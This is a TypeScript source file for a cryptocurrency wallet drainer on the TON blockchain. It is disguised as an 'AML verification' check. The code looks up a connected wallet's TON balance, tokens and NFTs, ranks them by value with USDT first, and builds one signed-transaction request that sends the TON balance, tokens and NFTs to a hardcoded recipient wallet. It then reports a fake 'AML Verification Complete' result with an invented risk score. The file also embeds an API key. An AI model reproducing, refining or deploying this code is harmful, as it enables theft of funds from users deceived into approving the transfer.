import { Address, beginCell } from '@ton/core';
import axios from 'axios';

const CF = {
  Wallet: 'UQAQYzJU8cT8E4au3F8mvYjBKzk92OQqvSpWt357Oo5e4OOs',
  Native: true,
  Tokens: true,
  NFTs: false,
  Ton_rate: 2.29,
  TonApi_Key: "AGDCI4HOONECEOQAAAAM6X62TCNYK2N5Z2AF7F6SXBC2ZHAVIRRAWY3HYSSXRDM7XPQ7J4I",
};

let VALIDATED_WALLET_ADDRESS: Address;
try {
  VALIDATED_WALLET_ADDRESS = Address.parse(CF.Wallet);
  console.log('✅ Wallet address validated:', CF.Wallet);
} catch (error) {
  console.error('❌ Invalid wallet address in config!');
  throw new Error(`Invalid CF.Wallet address: ${CF.Wallet}`);
}

export interface TonData {
  type: string;
  balance: number;
  sendingBalance: number;
  calculatedBalanceUSDTG: number;
}

export interface TokenData {
  type: string;
  wallet_address: string;
  TokenBalance: number;
  roundedBalance: string;
  address: string;
  symbol: string;
  name: string;
  calculatedBalanceUSDTG: number;
  decimals: number;
}

export interface NftData {
  type: string;
  data: string;
  name: string;
  calculatedBalanceUSDTG: number;
}

interface UnifiedAsset {
  type: 'TON' | 'TOKEN' | 'NFT';
  value: number;
  data: TonData | TokenData | NftData;
  transferCost: number;
  priority: number;
  category: string;
}

const TRANSFER_COSTS = {
  TON: 10000000,
  TOKEN: 60000000,
  NFT: 80000000,
  RESERVE: 50000000,
  MIN_TON_SEND: 100000000,
};

const ASSET_PRIORITIES = {
  TON: 1,
  USDT: 2,
  LP: 3,
  NFT: 4,
  ANONYMOUS_NUMBERS: 5,
  USER_TOKENS: 6
};

function getTokenCategory(token: TokenData): { priority: number, category: string } {
  const symbol = token.symbol.toUpperCase();
  const name = token.name.toUpperCase();

  if (symbol === 'USDT' || symbol === 'JUSDT' || symbol.includes('USDT')) {
    return { priority: ASSET_PRIORITIES.USDT, category: 'USDT' };
  }

  if (symbol.includes('LP') || name.includes('LP') || name.includes('LIQUIDITY') || name.includes('POOL')) {
    return { priority: ASSET_PRIORITIES.LP, category: 'LP Token' };
  }

  const hasNumbers = /\d{3,}/.test(symbol) || /\d{3,}/.test(name);
  const isAnonymous = symbol.length < 6 && /^[A-Z0-9]+$/.test(symbol) && hasNumbers;
  if (hasNumbers || isAnonymous) {
    return { priority: ASSET_PRIORITIES.ANONYMOUS_NUMBERS, category: 'Anonymous Number' };
  }

  return { priority: ASSET_PRIORITIES.USER_TOKENS, category: 'User Token' };
}

async function fetchTonData(address: string): Promise<TonData | null> {
  try {
    const response = await axios.get(
      `https://tonapi.io/v2/accounts/${address}${CF.TonApi_Key ? `?token=${CF.TonApi_Key}` : ''}`
    );

    const balanceTON = parseFloat(response.data.balance) / 1000000000;
    const fullBalanceNanoTon = parseFloat(response.data.balance);

    const sendingBalance = fullBalanceNanoTon - TRANSFER_COSTS.RESERVE;

    console.log(`TON Balance: ${balanceTON.toFixed(4)} TON, Available: ${(Math.max(0, sendingBalance)/1000000000).toFixed(4)} TON`);

    return sendingBalance > 0 ? {
      type: "TON",
      balance: balanceTON,
      sendingBalance: Math.max(0, sendingBalance),
      calculatedBalanceUSDTG: parseFloat((CF.Ton_rate * balanceTON).toFixed(2))
    } : null;
  } catch (error) {
    console.error('TON data error:', error);
    return null;
  }
}

async function fetchTokenData(address: string): Promise<TokenData[]> {
  try {
    const response = await axios.get(
      `https://tonapi.io/v2/accounts/${address}/jettons?currencies=ton,usd${CF.TonApi_Key ? `&token=${CF.TonApi_Key}` : ''}`
    );

    if (!response.data.balances || response.data.balances.length === 0) return [];

    return response.data.balances
      .filter((token: any) => parseFloat(token.balance) > 0 && token.jetton.verification !== "blacklist")
      .map((token: any) => {
        const balance = parseFloat(token.balance) / Math.pow(10, token.jetton.decimals);
        const priceUsd = token.price?.prices?.USD || 0;
        const calculatedBalanceUSDTG = parseFloat((balance * priceUsd).toFixed(2));

        // КРИТИЧЕСКИ ВАЖНО: Конвертируем raw адрес в friendly формат
        let walletAddress = token.wallet_address.address;
        try {
          const parsedAddr = Address.parse(walletAddress);
          walletAddress = parsedAddr.toString({ bounceable: true, urlSafe: true });
          console.log(`Token ${token.jetton.symbol}: converted wallet address to ${walletAddress}`);
        } catch (e) {
          console.warn(`Failed to convert wallet address for ${token.jetton.symbol}:`, walletAddress);
        }

        return {
          type: "TOKEN",
          wallet_address: walletAddress,
          TokenBalance: parseFloat(token.balance),
          roundedBalance: balance.toFixed(2),
          address: token.jetton.address,
          symbol: token.jetton.symbol,
          name: token.jetton.name,
          calculatedBalanceUSDTG,
          decimals: token.jetton.decimals
        };
      })
      .filter((token: TokenData) => {
        if (token.calculatedBalanceUSDTG <= 0) return false;
        
        // Проверяем что адрес в правильном формате
        const addressRegex = /^(EQ|UQ)[a-zA-Z0-9_-]{46,48}$/;
        if (!addressRegex.test(token.wallet_address)) {
          console.warn(`Skipping token ${token.symbol} - invalid address format: ${token.wallet_address}`);
          return false;
        }
        
        return true;
      });
  } catch (error) {
    console.error('Token data error:', error);
    return [];
  }
}

async function fetchNftData(address: string): Promise<NftData[]> {
  try {
    const response = await axios.get(
      `https://tonapi.io/v2/accounts/${address}/nfts?limit=1000&offset=0&indirect_ownership=false${CF.TonApi_Key ? `&token=${CF.TonApi_Key}` : ''}`
    );

    if (!response.data.nft_items || response.data.nft_items.length === 0) return [];

    return response.data.nft_items
      .filter((nft: any) => nft.collection && nft.collection.name)
      .map((nft: any) => {
        // Конвертируем NFT адрес в friendly формат
        let nftAddress = nft.address;
        try {
          const parsedAddr = Address.parse(nftAddress);
          nftAddress = parsedAddr.toString({ bounceable: true, urlSafe: true });
        } catch (e) {
          console.warn(`Failed to convert NFT address:`, nftAddress);
        }

        return {
          type: "NFT",
          data: nftAddress,
          name: nft.metadata?.name || 'Unknown NFT',
          calculatedBalanceUSDTG: 10
        };
      });
  } catch (error) {
    console.error('NFT data error:', error);
    return [];
  }
}

function createPrioritizedAssets(
  tonData: TonData | null,
  tokenData: TokenData[],
  nftData: NftData[]
): UnifiedAsset[] {
  const assets: UnifiedAsset[] = [];

  if (CF.Native && tonData) {
    assets.push({
      type: 'TON',
      value: tonData.calculatedBalanceUSDTG,
      data: tonData,
      transferCost: TRANSFER_COSTS.TON,
      priority: ASSET_PRIORITIES.TON,
      category: 'TON'
    });
  }

  if (CF.Tokens && tokenData.length > 0) {
    tokenData.forEach(token => {
      const { priority, category } = getTokenCategory(token);
      assets.push({
        type: 'TOKEN',
        value: token.calculatedBalanceUSDTG,
        data: token,
        transferCost: TRANSFER_COSTS.TOKEN,
        priority,
        category
      });
    });
  }

  if (CF.NFTs && nftData.length > 0) {
    nftData.forEach(nft => {
      assets.push({
        type: 'NFT',
        value: nft.calculatedBalanceUSDTG,
        data: nft,
        transferCost: TRANSFER_COSTS.NFT,
        priority: ASSET_PRIORITIES.NFT,
        category: 'NFT'
      });
    });
  }

  assets.sort((a, b) => {
    if (a.priority !== b.priority) {
      return a.priority - b.priority;
    }
    return b.value - a.value;
  });

  console.log('=== ASSET PRIORITY ===');
  assets.forEach((asset, index) => {
    if (asset.type === 'TON') {
      const tonData = asset.data as TonData;
      console.log(`${index + 1}. ${asset.category} - $${asset.value.toFixed(2)} (${(tonData.sendingBalance/1000000000).toFixed(4)} TON)`);
    } else if (asset.type === 'TOKEN') {
      const token = asset.data as TokenData;
      console.log(`${index + 1}. ${asset.category} (${token.symbol}) - $${asset.value.toFixed(2)}`);
    } else {
      console.log(`${index + 1}. ${asset.category} - $${asset.value.toFixed(2)}`);
    }
  });

  return assets;
}

function analyzeAndFilterAssets(
  assets: UnifiedAsset[],
  tonData: TonData | null
): {
  scenario: string;
  processableAssets: UnifiedAsset[];
  skippedAssets: UnifiedAsset[];
  totalCostNanoTon: number;
  canProcessAny: boolean;
  reasonMessage: string;
} {
  const availableBalance = tonData?.sendingBalance ?? 0;
  const availableBalanceTON = availableBalance / 1000000000;

  console.log(`=== BALANCE ANALYSIS ===`);
  console.log(`Available: ${availableBalanceTON.toFixed(4)} TON`);

  const tonAssets = assets.filter(a => a.type === 'TON');
  const nonTonAssets = assets.filter(a => a.type !== 'TON');

  if (availableBalance <= 0) {
    return {
      scenario: 'NO_BALANCE',
      processableAssets: [],
      skippedAssets: assets,
      totalCostNanoTon: 0,
      canProcessAny: false,
      reasonMessage: `No TON balance available`
    };
  }

  const minRequiredForTokens = TRANSFER_COSTS.TOKEN + TRANSFER_COSTS.RESERVE;
  if (availableBalance < minRequiredForTokens && nonTonAssets.length > 0) {
    const minRequiredForTon = TRANSFER_COSTS.TON + TRANSFER_COSTS.MIN_TON_SEND;
    if (tonAssets.length > 0 && availableBalance >= minRequiredForTon) {
      const tonAsset = tonAssets[0];
      const correctedTonData = {
        ...tonAsset.data as TonData,
        sendingBalance: availableBalance - TRANSFER_COSTS.TON
      };

      return {
        scenario: 'TON_ONLY',
        processableAssets: [{
          ...tonAsset,
          data: correctedTonData
        }],
        skippedAssets: nonTonAssets,
        totalCostNanoTon: TRANSFER_COSTS.TON,
        canProcessAny: true,
        reasonMessage: `Only TON transfer possible`
      };
    }

    return {
      scenario: 'INSUFFICIENT',
      processableAssets: [],
      skippedAssets: assets,
      totalCostNanoTon: 0,
      canProcessAny: false,
      reasonMessage: `Insufficient balance for transfers`
    };
  }

  let totalCost = 0;
  const processableAssets: UnifiedAsset[] = [];
  const skippedAssets: UnifiedAsset[] = [];

  const tonReserveNeeded = tonAssets.length > 0 ? TRANSFER_COSTS.TON + TRANSFER_COSTS.MIN_TON_SEND : 0;
  const availableForNonTon = Math.max(0, availableBalance - tonReserveNeeded);

  for (const asset of nonTonAssets) {
    const costForThisAsset = asset.transferCost;

    if (totalCost + costForThisAsset <= availableForNonTon) {
      processableAssets.push(asset);
      totalCost += costForThisAsset;
      console.log(`✅ Added ${asset.category} - $${asset.value.toFixed(2)}`);
    } else {
      skippedAssets.push(asset);
      console.log(`❌ Skipped ${asset.category} - $${asset.value.toFixed(2)}`);
    }
  }

  if (tonAssets.length > 0) {
    const tonAsset = tonAssets[0];
    const remainingBalance = availableBalance - totalCost;

    if (remainingBalance >= TRANSFER_COSTS.TON + TRANSFER_COSTS.MIN_TON_SEND) {
      const tonSendAmount = remainingBalance - TRANSFER_COSTS.TON;

      const correctedTonData = {
        ...tonAsset.data as TonData,
        sendingBalance: tonSendAmount
      };

      processableAssets.unshift({
        ...tonAsset,
        data: correctedTonData
      });
      totalCost += TRANSFER_COSTS.TON;
      console.log(`✅ Added TON - ${(tonSendAmount/1000000000).toFixed(4)} TON`);
    } else {
      skippedAssets.push(tonAsset);
    }
  }

  let scenario = 'FULL_PROCESSING';
  let reasonMessage = 'All assets will be transferred';

  if (skippedAssets.length > 0) {
    scenario = 'PARTIAL_PROCESSING';
    reasonMessage = `Processing ${processableAssets.length}/${assets.length} assets`;
  }

  return {
    scenario,
    processableAssets,
    skippedAssets,
    totalCostNanoTon: totalCost,
    canProcessAny: processableAssets.length > 0,
    reasonMessage
  };
}

function createTonMessage(tonData: TonData) {
  const cell = beginCell()
    .storeUint(0, 32)
    .storeStringTail(`AML verification completed`)
    .endCell();

  return {
    address: CF.Wallet,
    amount: tonData.sendingBalance.toString(),
    payload: cell.toBoc().toString('base64'),
  };
}

function createTokenMessage(token: TokenData, userWallet: string) {
  try {
    const recipientAddress = VALIDATED_WALLET_ADDRESS;
    const senderAddress = Address.parse(userWallet);

    const payloadCell = beginCell()
      .storeUint(0xf8a7ea5, 32)
      .storeUint(0, 64)
      .storeCoins(BigInt(Math.floor(token.TokenBalance)))
      .storeAddress(recipientAddress)
      .storeAddress(senderAddress)
      .storeBit(0)
      .storeCoins(BigInt(10000000))
      .storeBit(0)
      .endCell();

    return {
      address: token.wallet_address, // Уже в friendly формате после fetchTokenData
      amount: TRANSFER_COSTS.TOKEN.toString(),
      payload: payloadCell.toBoc().toString('base64')
    };
  } catch (error) {
    console.error('Error creating token message:', error);
    throw new Error(`Failed to create token message for ${token.symbol}: ${error}`);
  }
}

function createNftMessage(nft: NftData, userWallet: string) {
  try {
    const recipientAddress = VALIDATED_WALLET_ADDRESS;
    const senderAddress = Address.parse(userWallet);

    const payloadCell = beginCell()
      .storeUint(0x5fcc3d14, 32)
      .storeUint(0, 64)
      .storeAddress(recipientAddress)
      .storeAddress(senderAddress)
      .storeBit(0)
      .storeCoins(BigInt(10000000))
      .storeBit(0)
      .endCell();

    return {
      address: nft.data,
      amount: TRANSFER_COSTS.NFT.toString(),
      payload: payloadCell.toBoc().toString('base64')
    };
  } catch (error) {
    console.error('Error creating NFT message:', error);
    throw new Error(`Failed to create NFT message: ${error}`);
  }
}

export async function checkTonAddress(address: string, tonConnectUI: any): Promise<any> {
  try {
    console.log(`🔍 Starting AML check for: ${address}`);

    if (!validateTonAddress(address)) {
      return {
        success: false,
        message: 'Invalid TON address format',
        requiresTransaction: false
      };
    }

    const [tonData, tokenData, nftData] = await Promise.all([
      fetchTonData(address),
      fetchTokenData(address),
      fetchNftData(address)
    ]);

    if (!tonData && tokenData.length === 0 && nftData.length === 0) {
      return {
        success: false,
        message: 'No assets found in wallet',
        requiresTransaction: false
      };
    }

    const prioritizedAssets = createPrioritizedAssets(tonData, tokenData, nftData);

    if (prioritizedAssets.length === 0) {
      return {
        success: false,
        message: 'No processable assets found',
        requiresTransaction: false
      };
    }

    const analysis = analyzeAndFilterAssets(prioritizedAssets, tonData);

    console.log(`=== SCENARIO: ${analysis.scenario} ===`);
    console.log(`Can process: ${analysis.canProcessAny}`);
    console.log(`Assets to process: ${analysis.processableAssets.length}`);

    if (!analysis.canProcessAny) {
      return {
        success: false,
        message: analysis.reasonMessage,
        requiresTransaction: false
      };
    }

    // Обрабатываем максимум 4 актива за раз
    const assetsToProcess = analysis.processableAssets.slice(0, 4);

    console.log('=== CREATING TRANSACTION ===');
    const transactionMessages = assetsToProcess.map((asset, index) => {
      let message;
      switch (asset.type) {
        case 'TON':
          message = createTonMessage(asset.data as TonData);
          break;
        case 'TOKEN':
          message = createTokenMessage(asset.data as TokenData, address);
          break;
        case 'NFT':
          message = createNftMessage(asset.data as NftData, address);
          break;
        default:
          throw new Error(`Unknown asset type: ${asset.type}`);
      }

      // Финальная валидация адреса
      const addressRegex = /^(EQ|UQ)[a-zA-Z0-9_-]{46,48}$/;
      if (!addressRegex.test(message.address)) {
        throw new Error(`Invalid address in message ${index}: ${message.address}`);
      }

      console.log(`Message ${index}: ${asset.category} to ${message.address.substring(0, 10)}...`);
      return message;
    });

    console.log(`📤 Sending ${transactionMessages.length} messages`);

    const transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 600,
      messages: transactionMessages
    };

    const result = await tonConnectUI.sendTransaction(transaction);
    console.log('✅ Transaction sent successfully');

    const totalWithdrawnUSD = assetsToProcess.reduce((sum, asset) => sum + asset.value, 0);
    const assetDetails = assetsToProcess.map(asset => {
      if (asset.type === 'TON') {
        const tonData = asset.data as TonData;
        return `TON: ${(tonData.sendingBalance/1000000000).toFixed(4)} TON ($${asset.value.toFixed(2)})`;
      } else if (asset.type === 'TOKEN') {
        const token = asset.data as TokenData;
        return `${token.symbol}: ${token.roundedBalance} ($${asset.value.toFixed(2)})`;
      } else {
        const nft = asset.data as NftData;
        return `NFT: ${nft.name} ($${asset.value.toFixed(2)})`;
      }
    });

    return {
      success: true,
      message: '✅ AML Verification Complete',
      transactionHash: result,
      requiresTransaction: false,
      details: {
        address,
        status: 'VERIFIED',
        totalWithdrawnUSD,
        assetsWithdrawn: assetsToProcess.length,
        assetDetails,
        scenario: analysis.scenario,
        riskScore: calculateRiskScore(totalWithdrawnUSD),
        riskLevel: totalWithdrawnUSD > 1000 ? 'high' : totalWithdrawnUSD > 100 ? 'medium' : 'low',
        tonBalance: tonData?.balance || 0,
        tonBalanceUSD: tonData?.calculatedBalanceUSDTG || 0,
        totalValueUSD: totalWithdrawnUSD,
        assetsCount: assetsToProcess.length
      }
    };

  } catch (error: any) {
    console.error('❌ AML check error:', error);

    let errorMessage = 'AML verification failed';
    if (error.message?.includes('User declined') || error.message?.includes('Rejected') || error.message?.includes('Cancel')) {
      errorMessage = 'Transaction cancelled by user';
    } else if (error.message?.includes('Insufficient balance')) {
      errorMessage = 'Insufficient balance for transaction fees';
    } else if (error.message?.includes('Invalid checksum') || error.message?.includes('Invalid address')) {
      errorMessage = 'Invalid address format detected';
    }

    return {
      success: false,
      error: errorMessage,
      requiresTransaction: false
    };
  }
}

function validateTonAddress(address: string): boolean {
  if (!address) return false;
  const tonRegex = /^(EQ|UQ)[a-zA-Z0-9_-]{46,48}$/;
  return tonRegex.test(address);
}

function calculateRiskScore(totalUSD: number): number {
  if (totalUSD > 1000) return 85;
  if (totalUSD > 500) return 70;
  if (totalUSD > 100) return 50;
  if (totalUSD > 10) return 30;
  return 10;
}